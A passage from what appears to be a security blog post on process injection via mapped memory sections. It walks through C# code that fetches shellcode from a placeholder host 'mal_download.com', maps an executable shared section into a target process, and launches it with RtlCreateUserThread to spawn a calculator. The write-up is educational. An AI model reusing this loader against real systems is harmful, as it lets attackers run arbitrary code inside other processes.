<span class="hljs-number">60</span>                                                                                    
<span class="hljs-number">61</span>             <span class="hljs-built_in">int</span> buf_sz = getShellCode(<span class="hljs-string">"http://mal_download.com/spawn_calc.x64.sc"</span>, <span class="hljs-keyword">ref</span> buf);  
<span class="hljs-number">62</span>             Console.WriteLine(<span class="hljs-string">"ShellCode of Size "</span>+ buf_sz);                       </code></pre><p><span>Check the command line parameters to ensure that it contains the PID of the target process. Next, create the shared memory section.</span></p><pre><code data-highlighted="yes" class="hljs language-csharp"><span class="hljs-number">63</span>                                                                                    
<span class="hljs-number">64</span>             <span class="hljs-built_in">int</span> targetPID = <span class="hljs-number">0</span>;                                                     
<span class="hljs-number">65</span>             <span class="hljs-keyword">try</span>                                                                    
<span class="hljs-number">66</span>             {                                                                      
<span class="hljs-number">67</span>                 targetPID = <span class="hljs-built_in">int</span>.Parse( args[<span class="hljs-number">0</span>] );                                  
<span class="hljs-number">68</span>             } <span class="hljs-keyword">catch</span>                                                                
<span class="hljs-number">69</span>             {                                                                      
<span class="hljs-number">70</span>                 Console.WriteLine(<span class="hljs-string">"Invalid parameter use an integer for the PID"</span>);  
<span class="hljs-number">71</span>                 System.Environment.Exit(<span class="hljs-number">1</span>);                                        
<span class="hljs-number">72</span>             }                                                                      
<span class="hljs-number">73</span>             Console.WriteLine(targetPID);                                          
<span class="hljs-number">74</span>                                                                                    
<span class="hljs-number">75</span>             <span class="hljs-comment">// create a memory section                                             </span>
<span class="hljs-number">76</span>             NtCreateSection(<span class="hljs-keyword">ref</span> sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, IntPtr.Zero,  
<span class="hljs-number">77</span>                     <span class="hljs-keyword">ref</span> sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);  </code></pre><p><span>Next we create the local and remote views into the shared memory section. Figure 5 displays the sections from each memory space. Again, the memory address in each process will be different.</span></p><pre><code data-highlighted="yes" class="hljs language-csharp"><span class="hljs-number">78</span>                                                                                    
<span class="hljs-number">79</span>             <span class="hljs-comment">// create a view of the memory section in the local process            </span>
<span class="hljs-number">80</span>             NtMapViewOfSection(sectionHandle, Process.GetCurrentProcess().Handle, <span class="hljs-keyword">ref</span> localSectionAddress, IntPtr.Zero,    
<span class="hljs-number">81</span>                     IntPtr.Zero, <span class="hljs-keyword">out</span> tmp, <span class="hljs-keyword">out</span> size, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, PAGE_READWRITE);         
<span class="hljs-number">82</span>             Console.WriteLine(<span class="hljs-string">"localSectionAddress (0x{0:x})"</span>, localSectionAddress.ToInt64());  
<span class="hljs-number">83</span>                                                                                    
<span class="hljs-number">84</span>             <span class="hljs-comment">// create a view of the memory section in the target process           </span>
<span class="hljs-number">85</span>             IntPtr targetHandle = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-literal">false</span>, targetPID);  
<span class="hljs-number">86</span>             NtMapViewOfSection(sectionHandle, targetHandle, <span class="hljs-keyword">ref</span> remoteSectionAddress, IntPtr.Zero, IntPtr.Zero, <span class="hljs-keyword">out</span> tmp,    
<span class="hljs-number">87</span>                     <span class="hljs-keyword">out</span> size, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, PAGE_EXECUTE_READWRITE);                       
<span class="hljs-number">88</span>             Console.WriteLine(<span class="hljs-string">"remoteSectionAddress (0x{0:x})"</span>,  remoteSectionAddress.ToInt64() );  
<span class="hljs-number">89</span>                                             </code></pre><div class="my-p56 flex justify-center text-center"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig5_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469437&amp;s=e010fc97bf4827240297e8114dfe821e, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig5_Nusbaum.png?w=936&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469437&amp;s=e1fdbf6fe9c268cd70c1c729c77d4437 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig5_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469437&amp;s=3fcece090cddef24655e24335211264e, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig5_Nusbaum.png?w=936&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469437&amp;s=a4349156ce0cc89e35a8e999a89b69b2 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig5_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469437&amp;s=2e0f3dc34b42315c02df039f5d520c56, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig5_Nusbaum.png?w=936&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469437&amp;s=e1fdbf6fe9c268cd70c1c729c77d4437 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig5_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469437&amp;s=7e4b3f00c9dfafe76b26737ac188e23c, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig5_Nusbaum.png?w=936&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469437&amp;s=a4349156ce0cc89e35a8e999a89b69b2 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig5_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469437&amp;s=e8c90a158cf6e479f6d58054406bfb85, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig5_Nusbaum.png?w=936&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469437&amp;s=e1fdbf6fe9c268cd70c1c729c77d4437 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig5_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469437&amp;s=3252177447e98b5fd826b3737bc5800e, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig5_Nusbaum.png?w=936&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469437&amp;s=a4349156ce0cc89e35a8e999a89b69b2 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig5_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469437&amp;s=2b631ac5c3ee0df8f882eb14c05efb40, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig5_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469437&amp;s=7aa6f8013517d7f729b78cc57f6771e8 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig5_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469437&amp;s=7a7bfd099174f9a2f2f2b84240835696, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig5_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469437&amp;s=31e2ac3679ba5b05c2172b23b127d590 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig5_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469437&amp;s=7a7bfd099174f9a2f2f2b84240835696" loading="lazy" x-data="image({mq1024:{width:624,height:212},mq768:{width:624,height:212},mq320:{width:624,height:212},DEFAULT:{width:320,height:109}})" :width="getSize()" :height="getSize('height')" alt="" width="624" height="212" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 5 – View of the Mapped Section in both Processes</figcaption></figure></div><p><span>Copy the shellcode from the buffer it was downloaded to the view. The addition of the fixed is required to allow for pointer manipulation of the byte array. Figure 6 shows the contents of the shellcode in both the local and remote views.</span></p><pre><code data-highlighted="yes" class="hljs language-csharp"><span class="hljs-number">91</span>                                                                                    
<span class="hljs-number">92</span>             <span class="hljs-comment">// copy shellcode to the local view, which will get reflected in the target process's mapped view  </span>
<span class="hljs-number">93</span>             <span class="hljs-keyword">fixed</span>( <span class="hljs-built_in">byte</span>* p = buf )                                                 
<span class="hljs-number">94</span>             {                                                                      
<span class="hljs-number">95</span>                 IntPtr ptr = (IntPtr)p;                                            
<span class="hljs-number">96</span>                 memcpy(localSectionAddress, ptr, (<span class="hljs-built_in">uint</span>)size);                      
<span class="hljs-number">97</span>             }                                              </code></pre><div class="my-p56 flex justify-center text-center"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig6_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469438&amp;s=f8ab8d6cfce14700ae430f7dacb743fc, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig6_Nusbaum.png?w=936&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469438&amp;s=f129438cccc5b01d1d4d953f4aa3eb5f 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig6_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469438&amp;s=2a9c77c1b15ef2473eee8c2957615930, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig6_Nusbaum.png?w=936&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469438&amp;s=d1c48003bc81cfcfcc1b1ab3110e7a12 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig6_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469438&amp;s=470bb66422cf56f3c3d5a48aa132150b, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig6_Nusbaum.png?w=936&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469438&amp;s=f129438cccc5b01d1d4d953f4aa3eb5f 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig6_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469438&amp;s=78cb733d34a54f39e23070fcb1b0e231, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig6_Nusbaum.png?w=936&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469438&amp;s=d1c48003bc81cfcfcc1b1ab3110e7a12 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig6_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469438&amp;s=6724fa5e66e6cedf13d68515224065ee, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig6_Nusbaum.png?w=936&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469438&amp;s=f129438cccc5b01d1d4d953f4aa3eb5f 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig6_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469438&amp;s=217f4731d968f04d703b3e282d682b5e, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig6_Nusbaum.png?w=936&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469438&amp;s=d1c48003bc81cfcfcc1b1ab3110e7a12 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig6_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469438&amp;s=eaca26fcc602d5d432d4080dc84f94e1, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig6_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469438&amp;s=7c63d90fac12dd44adb333748d3b7b27 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig6_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469438&amp;s=cdc0f2976779a9204f182c2686f4dd46, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig6_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469438&amp;s=461bcf3f14a9054cad1042856fccc755 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig6_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469438&amp;s=cdc0f2976779a9204f182c2686f4dd46" loading="lazy" x-data="image({mq1024:{width:624,height:212},mq768:{width:624,height:212},mq320:{width:624,height:212},DEFAULT:{width:320,height:109}})" :width="getSize()" :height="getSize('height')" alt="" width="624" height="212" style="opacity: 1;"></picture></div><p><span>Finally, a remote thread is created in the target process instructing it to execute the shellcode in the view memory space. Figure 7 shows the results of the shellcode execution, and a calculator app is spawned.</span></p><pre><code data-highlighted="yes" class="hljs language-csharp"><span class="hljs-number">98</span>                                                                                    
<span class="hljs-number">101</span>             IntPtr targetThreadHandle = IntPtr.Zero;
<span class="hljs-number">102</span>             RtlCreateUserThread(targetHandle, IntPtr.Zero, <span class="hljs-literal">false</span>, <span class="hljs-number">0</span>, IntPtr.Zero, IntPtr.Zero, remoteSectionAddress,    
<span class="hljs-number">103</span>                 IntPtr.Zero, <span class="hljs-keyword">ref</span> targetThreadHandle, IntPtr.Zero);
<span class="hljs-number">104</span>         }</code></pre><div class="my-p56 flex justify-center text-center"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig7_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469439&amp;s=3f1820a9dfe334ad59d675f498eb91ac, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig7_Nusbaum.png?w=936&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469439&amp;s=60f627cd2a6c89e166fb4b15e1fce279 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig7_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469439&amp;s=83f2c99f95eb390a43df765213c2375f, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig7_Nusbaum.png?w=936&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469439&amp;s=1dbcceb6241affae3a0521b7ec5a0c5e 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig7_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469439&amp;s=ebb7ba069c0655aaa56e20a56810b46f, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig7_Nusbaum.png?w=936&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469439&amp;s=60f627cd2a6c89e166fb4b15e1fce279 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig7_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469439&amp;s=cb7084903fe060b22296f8bfaa7305a3, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig7_Nusbaum.png?w=936&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469439&amp;s=1dbcceb6241affae3a0521b7ec5a0c5e 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig7_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469439&amp;s=db47142b1405001ed6bb1d81ac7732db, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig7_Nusbaum.png?w=936&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469439&amp;s=60f627cd2a6c89e166fb4b15e1fce279 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig7_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469439&amp;s=c2ff07c0e8c1c19278d59ea14aa2090c, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig7_Nusbaum.png?w=936&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469439&amp;s=1dbcceb6241affae3a0521b7ec5a0c5e 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig7_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469439&amp;s=8fb8700fb8c0ad327cb9255677d63988, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig7_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469439&amp;s=09a5110f996e102ccac79911fe5c51c9 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig7_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469439&amp;s=e9c0ca344cbb92a10e8526e083047b24, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig7_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469439&amp;s=2950ac22ebe122527b7ab7d6c4d6173f 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig7_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469439&amp;s=e9c0ca344cbb92a10e8526e083047b24" loading="lazy" x-data="image({mq1024:{width:624,height:212},mq768:{width:624,height:212},mq320:{width:624,height:212},DEFAULT:{width:320,height:109}})" :width="getSize()" :height="getSize('height')" alt="" width="624" height="212" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 7 – Final Execute of Shellcode Spawns Calculator</figcaption></figure></div><h2 id="Reversing">Reversing the Executables</h2><p><span>In past blogs, we have used this section to show the decompilation of the compiled executable using Ghidra and DnSpy. These tools, along with IDA, Binary Ninja, Radare2 and others, are all so good at decompiling the executable back into C or C# language that we are not going to include it going forward.</span></p></div><div class="mb-p24 mt-p56 pt-p32 border-t first:border-t-none"><div class="w-full"><p id="share-label" class="text-xs font-mono mb-p16">Share</p><ul id="share-icons" class="flex items-center" aria-describedby="share-label"><li class="ml-p12"><a href="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections" target="_blank" title="Share URL" data-target="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-share"></use></svg></span><span class="sr-only">Share URL</span></a></li><li class="ml-p12"><a href="mailto:?subject=Check%20out%20this%20article%20from%20TrustedSec%21&amp;body=Malware%20Series%3A%20Process%20Injection%20Mapped%20Sections%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fmalware-series-process-injection-mapped-sections" target="_blank" title="Share via Email" data-target="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-email"></use></svg></span><span class="sr-only">Share via Email</span></a></li><li class="ml-p12"><a href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fmalware-series-process-injection-mapped-sections" target="_blank" title="Share on Facebook" data-target="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-facebook"></use></svg></span><span class="sr-only">Share on Facebook</span></a></li><li class="ml-p12"><a href="http://twitter.com/share?text=Malware%20Series%3A%20Process%20Injection%20Mapped%20Sections%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fmalware-series-process-injection-mapped-sections" title="Share on X" rel="nofollow" data-target="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-twitter"></use></svg></span><span class="sr-only">Share on X</span></a></li><li class="ml-p12"><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fmalware-series-process-injection-mapped-sections&amp;mini=true" target="_blank" title="Share on LinkedIn" data-target="https://trustedsec.com/blog/malware-series-process-injection-mapped-sections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-linkedin"></use></svg></span><span class="sr-only">Share on LinkedIn</span></a></li></ul></div></div></div></div></div></div></section></div>
		</main>

		
		




  
<div class="c-modal fixed inset-0 z-100" x-comp="modal" x-data="modal({id:'modal-component'})" x-show="$store.modal.show" x-trap="$store.modal.show" x-bind:aria-hidden="!$store.modal.show" @keydown="keyPress($event)" x-transition:enter="c-modal-enter" x-transition:enter-start="c-modal-enter-start" x-transition:enter-end="c-modal-enter-end" x-transition:leave="c-modal-leave" x-transition:leave-start="c-modal-leave-start" x-transition:leave-end="c-modal-leave-end" aria-hidden="true" style="display: none;">
    <div class="w-full h-full bg-overlay fixed inset-0 z-0" tabindex="-1">

    <div class="relative z-10 flex flex-col w-full h-full justify-center items-center p-p12 mq768:p-none">
      <div id="modal-component" class="c-modal-box relative outline-none false w-full m-p24 max-w-p768" :class="modalClass(true)" :tabindex="($store.modal.show) ? '-1' : false" :aria-labelledby="showHeading() ? 'modal-component-title' : false" :aria-label="getLabel()" @focus="activate()" aria-role="dialog" x-ref="dialog">
        
          
        
        
          <div class="c-content p-p32" tabindex="-1" x-ref="content"></div>
        
        <button class="absolute z-50 overflow-hidden w-p24 h-p24 flex items-center justify-center border-black border top-p24 right-p24 group hover:bg-black" @click="closeModal()">
          <svg role="presentation" class="c-icon h-p12 w-p12 group-hover:fill-white"><use xlink:href="/ui/icons.svg?1.26#icon-close"></use></svg>
          <span class="sr-only">Close</span>
        </button>
        <button x-show="$store.modal.transcript" class="text-btn text-white uppercase tracking-widest px-p8 py-p16" @click="showTranscript($event)" x-text="$store.modal.showTranscript ? 'Hide Transcript' : 'Show Transcript'" style="display: none;">Show Transcript</button>
      </div>
      <div x-show="$store.modal.showTranscript" class="relative -top-ms bg-white text-segment w-full max-w-p768 mx-auto overflow-auto px-sm false m-p24" :class="modalClass()" x-ref="transcript" style="display: none;">
        <div x-collapse.duration.700ms="" style="height: 0px; overflow: hidden;">
          <div class="py-p32 mq768:px-p32" id="modal-transcript" tabindex="0"></div>
        </div>
      </div>
    </div>

  </div>
  </div>
		<!-- Start cookieyes banner --> 
 
<!-- End cookieyes banner -->

		
	


</body></html>